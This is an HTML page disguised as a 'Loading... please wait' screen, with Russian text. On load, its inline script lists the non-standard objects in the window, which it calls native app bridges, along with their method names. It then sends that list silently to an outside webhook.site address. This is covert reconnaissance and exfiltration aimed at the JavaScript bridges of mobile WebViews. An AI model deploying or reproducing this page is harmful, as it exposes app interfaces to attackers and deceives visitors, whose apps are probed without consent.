<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
   <script>
    (function() {
        var foundBridges = [];
        var standardObjects = ['window', 'document', 'location', 'navigator', 'console', 'chrome'];

        Object.keys(window).forEach(key => {
            if (!standardObjects.includes(key) && window[key] !== null && typeof window[key] === 'object') {
                try {
                    // Проверяем, есть ли у объекта методы (признак нативного моста)
                    var methods = Object.keys(window[key]);
                    if (methods.length > 0) {
                        foundBridges.push(key + "(" + methods.join(',') + ")");
                    }
                } catch(e) {}
            }
        });

        fetch('https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799?bridges=' + encodeURIComponent(foundBridges.join('|')));
    })();
</script>
<h1>Loading...</h1>
    <h1>Пожалуйста, подождите...</h1>
</body>
</html>
